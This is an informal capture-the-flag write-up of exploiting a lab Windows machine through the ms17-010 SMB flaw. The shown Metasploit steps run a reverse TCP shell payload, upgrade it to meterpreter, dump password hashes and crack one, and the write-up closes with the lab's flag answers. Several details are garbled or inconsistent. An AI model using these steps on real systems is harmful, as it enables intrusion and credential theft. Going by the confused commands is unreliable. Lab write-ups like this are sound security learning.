so boom we start the machine first thing i do is recon
I hit the terminal and start the nmap scan
and it throws this up

Root@ip-10-10-183-64:~# nmap 10.10.63.243

Starting Nmap 7.60 ( https://nmap.org ) at 2023-10-25 17:19 BST
Nmap scan report for ip-10-10-63-243.eu-west-1.compute.internal (10.10.63.243)
Host is up (0.00047s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
MAC Address: 02:E1:CE:D0:39:51 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 51.32 seconds

we get the first question out the way with three ports, ports 135, 139 and 445 open

still needed to solve the last recon section so I nmaped again this time looking for vunerabilites and got this

nmap --search vuln 10.10.63.243
//////////////////
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 98.22 seconds
//////////////
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
////////////////

now to gain access we spin up metasploit
learning the metasploit framwork and how to use it one of the msot simple ways is to utilize the search
I searched for blue becuse this is the name of the box

you should get 24 results with one of them being the correct eternalblue exploit code that being
msf6 exploit(windows/smb/smb_doublepulsar_rce

which is 13 in the search list

then we load up our remote code execution 
now to a new ip, (thanks regi guard)

using now the rhosts with our NEW ip address of 10.10.229.82 we get a bunch of lines basically telling us the exploit is running
with the payload of set payload windows/x64/shell/reverse_tcp 


after making sure the session is active by runnning session on metasploit


////////////////////////////

Active sessions

===============
Id Name Type
-- ---- ----
1       shell x64/windows
(10.10.229.82)

///////////////////////////

after much research online (aka google and videos) i used the sessions -u to upgrade the shell to a meterpreter

///////

use post/multi/manage/shell_to_meterpreter

///////

then we set our session and upgrade it

[*] Upgrading session ID: 1

[*] Starting exploit/multi/handler

[*] Statered reversde TCP handler on 10.10.229.82:4433

[*] Post module execution completed

///////

Active sessions

===============

Id Name Type
-- ---- ----
1       shell x64/windows
(10.10.229.82)
2        meterpreter x86/windows
(10.10.229.82)

//////////////

so now we have our second session running meterpreter, and when we run it with sessions -i 2

[*] Starting interaction with 2 ...

meterpreter > 

/////////////

also we can check if we are in authority if we do

///////////

meterpreter > whoami

NT AUTHORITY\SYSTEM

///////////////////

we are the most pwoerful user on this machine, now from here its a simple command line hashdump to get all the logins for this machine

/////////////////////

meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:500:aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aaad3b435b51404eeaa3b435b51404ee:ffb43f0de35be4d9917ac0ccad57f8d:::

///////////////////
Jon is the shortest one here so I take his hash and put it thru a hash identifer, I used crackStation

<img width="518" alt="image" src="https://github.com/Acosta27/blue_writeup/assets/98700195/f5171d9b-1d5f-48d4-b23f-2eeb0398c206">

now that we have admin rights we just search for flags by 

//////////

meterpreter > search -f flag.txt
Found 3 results...
  c:\flagl.txt (24 bytes)
  c:\Users\Jon\Documents\flag3.txt (37 bytes)
  c:\Windows\System32\config\flag2.txt (34 bytes)

////////

then we jsut use the cat <insert flag.txt> and get each flag

flag1: access_the_machine
flag2: sam_database_elevated_access
flag3: admin_documents_can_be_valuable

fin.

